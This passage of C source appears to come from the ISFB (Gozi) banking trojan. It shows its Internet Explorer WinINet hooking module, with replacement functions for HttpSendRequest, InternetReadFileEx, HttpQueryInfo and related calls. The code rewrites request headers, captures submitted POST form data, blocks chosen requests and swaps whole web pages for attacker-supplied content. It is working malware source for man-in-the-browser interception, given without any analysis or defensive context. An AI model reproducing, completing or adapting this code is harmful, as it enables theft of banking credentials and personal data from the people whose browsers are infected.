	ENTER_HOOK();
	Ret = CommonInternetReadFileEx(hFile, lpBuffersOut, dwFlags, dwContext, FALSE);
	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_InternetReadFileExW(HINTERNET hFile, LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
{
	BOOL Ret;
	ENTER_HOOK();
	Ret = CommonInternetReadFileEx(hFile, (LPINTERNET_BUFFERS)lpBuffersOut, dwFlags, dwContext, TRUE);
	LEAVE_HOOK();
	return(Ret);
}

BOOL WINAPI my_HttpSendRequestA(HINTERNET hRequest, LPSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	BOOL	Ret = FALSE;
	LPSTR	NewHeaders, pHeaders = NULL;
	WINERROR Error;
	PHANDLE_CONTEXT	Ctx = NULL;

	ENTER_HOOK();

	if (NewHeaders = IeCreateContextModifyHeadersA(hRequest, lpszHeaders, dwHeadersLength, &pHeaders, &Ctx))
		lpszHeaders = NewHeaders;

	if (Ctx && Ctx->Status == REQUEST_BLOCKED)
	{
		ReleaseHandle(Ctx);
		Error = ERROR_INTERNET_CANNOT_CONNECT;
	}
	else
	{
		if ((dwOptionalLength) && (lpOptional))
			IeQueryUrlPostForms(hRequest, pHeaders, lpOptional, dwOptionalLength);

		Ret = HttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);

		Error = GetLastError();
	}

	if (NewHeaders)
		hFree(NewHeaders);

	if (pHeaders)
		hFree(pHeaders);

	SetLastError(Error);

	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_HttpSendRequestW(HINTERNET hRequest, LPWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	BOOL	Ret = FALSE;
	LPWSTR	NewHeaders;
	LPSTR	pHeaders = NULL;
	WINERROR Error;
	PHANDLE_CONTEXT	Ctx = NULL;

	ENTER_HOOK();

	if (NewHeaders = IeCreateContextModifyHeadersW(hRequest, lpszHeaders, dwHeadersLength, &pHeaders, &Ctx))
		lpszHeaders = NewHeaders;

	if (Ctx && Ctx->Status == REQUEST_BLOCKED)
	{
		ReleaseHandle(Ctx);
		Error = ERROR_INTERNET_CANNOT_CONNECT;
	}
	else
	{
		if ((dwOptionalLength) && (lpOptional))
			IeQueryUrlPostForms(hRequest, pHeaders, lpOptional, dwOptionalLength);

		Ret = HttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);

		Error = GetLastError();
	}

	if (NewHeaders)
		hFree(NewHeaders);

	if (pHeaders)
		hFree(pHeaders);

	SetLastError(Error);

	LEAVE_HOOK();
	return(Ret);
}


void CALLBACK my_InternetStatusCallback(HINTERNET hRequest, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
{
	LPINTERNET_ASYNC_RESULT	AsyncResult = (LPINTERNET_ASYNC_RESULT) lpvStatusInformation;
	INTERNET_STATUS_CALLBACK RealInetCallback;
	PHANDLE_CONTEXT Ctx;

	ENTER_HOOK();

	if (Ctx = FindHandle(hRequest))
	{
		switch (dwInternetStatus)
		{
		case INTERNET_STATUS_HANDLE_CLOSING:
			DelHandle(hRequest);
			break;
		case INTERNET_STATUS_REQUEST_COMPLETE:
			if (Ctx->Status == DOWNLOADING)
			{
				if (!AsyncResult->dwResult)
					Ctx->Status = ERROR_WHILE_LOADING;

				SetEvent(Ctx->AsyncEvent);

				ReleaseHandle(Ctx);
				LEAVE_HOOK();
				return;
			}	// if (Ctx->Status == DOWNLOADING)
			else
			{
				ULONG	HttpStatus, bSize = sizeof(ULONG);
				if (HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE, &HttpStatus, &bSize, &bSize))
				{
					if (HttpStatus == 1)
					{
						__debugbreak();
					}
					
				}
				else
					bSize = GetLastError();
			}
			break;
		default:
			break;
		}	// switch (dwInternetStatus)
		
		if (RealInetCallback = Ctx->Callback)
		{
			ASSERT((LONG_PTR)Ctx->Callback > 0);	// User-mode address
			(RealInetCallback) (hRequest, dwContext, dwInternetStatus, lpvStatusInformation, dwStatusInformationLength);
		}

		ReleaseHandle(Ctx);
	}	// if (Ctx = FindHandle(hInternet))

	LEAVE_HOOK();
}


BOOL WINAPI my_InternetQueryDataAvailable(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext)
{
	BOOL Ret = FALSE;
	PHANDLE_CONTEXT Ctx;
	
	ENTER_HOOK();

	*lpdwNumberOfBytesAvailable = 0;

	if (Ctx = IeGetContext(hFile))
	{
		do	// not a loop
		{
			ULONG	Pos;
			ULONG	Length;

			GetPageContent(Ctx, hFile);
		
			Pos = StreamGetPos(Ctx->pStream);
			Length = StreamGetLength(Ctx->pStream);
			*lpdwNumberOfBytesAvailable = Length - Pos;

			Ret = TRUE;

		} while(FALSE);

		ReleaseHandle(Ctx);
	}
	else
		Ret = InternetQueryDataAvailable( hFile, lpdwNumberOfBytesAvailable, dwFlags, dwContext);

	LEAVE_HOOK();
	return(Ret);
}

// Theese two functions are used to obtain user agent string from a browser and to activate the Parser.
HINTERNET WINAPI my_InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUsername, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
	HINTERNET hConnection;
	ENTER_HOOK();

	hConnection = InternetConnectA(hInternet, lpszServerName, nServerPort, lpszUsername, lpszPassword, dwService, dwFlags, dwContext);
	if (hConnection && !g_UserAgentStr)
		IeActivateParser(hInternet);

	LEAVE_HOOK();
	return(hConnection);
}


HINTERNET WINAPI my_InternetConnectW(HINTERNET hInternet, LPWSTR lpszServerName, INTERNET_PORT nServerPort, LPWSTR lpszUsername, LPWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
	HINTERNET hConnection;
	ENTER_HOOK();

	hConnection = InternetConnectW(hInternet, lpszServerName, nServerPort, lpszUsername, lpszPassword, dwService, dwFlags, dwContext);
	if (hConnection && !g_UserAgentStr)
		IeActivateParser(hInternet);

	LEAVE_HOOK();
	return(hConnection);
}

//
//	This function used for full page replace. The idea is to redirect querying any infromation from the source page 
//	 HTTTP headers to the result page HTTP headers.
//
static BOOL HttpQueryInfoCommon(
	HINTERNET	hRequest, 
	DWORD		dwInfoLevel, 
	LPVOID		lpvBuffer, 
	LPDWORD		lpdwBufferLength, 
	LPDWORD		lpdwIndex,
	BOOL		bUnicode
	)
{
	BOOL Ret = FALSE;
	PHANDLE_CONTEXT Ctx;

	if (Ctx = FindHandle(hRequest))
	{
		// Checking if the page will be replaced
		if (Ctx->Flags & CF_REPLACE)
		{
			PTRANSFER_CONTEXT	tCtx = (PTRANSFER_CONTEXT)Ctx->tCtx;

			DbgPrint("ISFB_%04x: HttpQueryInfo replace, dwInfoLevel = %u\n", g_CurrentProcessId, dwInfoLevel);

			// Copmlete loading of the page to replace with
			if ((tCtx) && ((tCtx->Headers) || (TransferCompleteReceive(tCtx, TRUE) == NO_ERROR)))
				// Replacing request handle
				hRequest = tCtx->hRequest;
		}	// if (Ctx->Flags & CF_REPLACE)
		ReleaseHandle(Ctx);
	}	// if (Ctx = FindHandle(hRequest))

	if (bUnicode)
		Ret = HttpQueryInfoW(hRequest, dwInfoLevel, lpvBuffer, lpdwBufferLength, lpdwIndex);
	else
		Ret = HttpQueryInfoA(hRequest, dwInfoLevel, lpvBuffer, lpdwBufferLength, lpdwIndex);

	return(Ret);
}

BOOL WINAPI my_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)
{
	BOOL Ret;
	ENTER_HOOK();
	Ret = HttpQueryInfoCommon(hRequest, dwInfoLevel, lpvBuffer, lpdwBufferLength, lpdwIndex, FALSE);
	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex)
{
	BOOL Ret;
	ENTER_HOOK();
	Ret = HttpQueryInfoCommon(hRequest, dwInfoLevel, lpvBuffer, lpdwBufferLength, lpdwIndex, TRUE);
	LEAVE_HOOK();
	return(Ret);
}


BOOL WINAPI my_HttpAddRequestHeadersA(HINTERNET hRequest, LPSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers)
{
	BOOL	Ret;
	LPSTR	NewHeaders;

	ENTER_HOOK();

	if (NewHeaders = IeCreateContextModifyHeadersA(hRequest, lpszHeaders, dwHeadersLength, NULL, NULL))
		lpszHeaders = NewHeaders;

	Ret = HttpAddRequestHeadersA(hRequest, lpszHeaders, dwHeadersLength, dwModifiers);

	if (NewHeaders)
		hFree(NewHeaders);

	LEAVE_HOOK();
	return(Ret);

}

BOOL WINAPI my_HttpAddRequestHeadersW(HINTERNET hRequest, LPWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers)
{
	BOOL	Ret;
	LPWSTR	NewHeaders;

	ENTER_HOOK();

	if (NewHeaders = IeCreateContextModifyHeadersW(hRequest, lpszHeaders, dwHeadersLength, NULL, NULL))
		lpszHeaders = NewHeaders;

	Ret = HttpAddRequestHeadersW(hRequest, lpszHeaders, dwHeadersLength, dwModifiers);

	if (NewHeaders)
		hFree(NewHeaders);

	LEAVE_HOOK();
	return(Ret);

}


#ifdef _IE_DISABLE_REDIRECT
//
//	This hook used to specify INTERNET_FLAG_NO_AUTO_REDIRECT flag while creating a new HTTP request.
//	This flag disables HTTP redirection within WININET and makes IE to process the redirection manually
//		so it can be handled by us.
//
HINTERNET WINAPI my_HttpOpenRequestW(
	HINTERNET hConnect,
	LPWSTR lpszVerb,
	LPWSTR lpszObjectName,
	LPWSTR lpszVersion,
	LPWSTR lpszReferer,
	LPWSTR *lplpszAcceptTypes,
	DWORD dwFlags,
	DWORD_PTR dwContext
	)
{
	return(HttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferer, 
		lplpszAcceptTypes, dwFlags | INTERNET_FLAG_NO_AUTO_REDIRECT, dwContext));
}
#endif	// _IE_DISABLE_REDIRECT
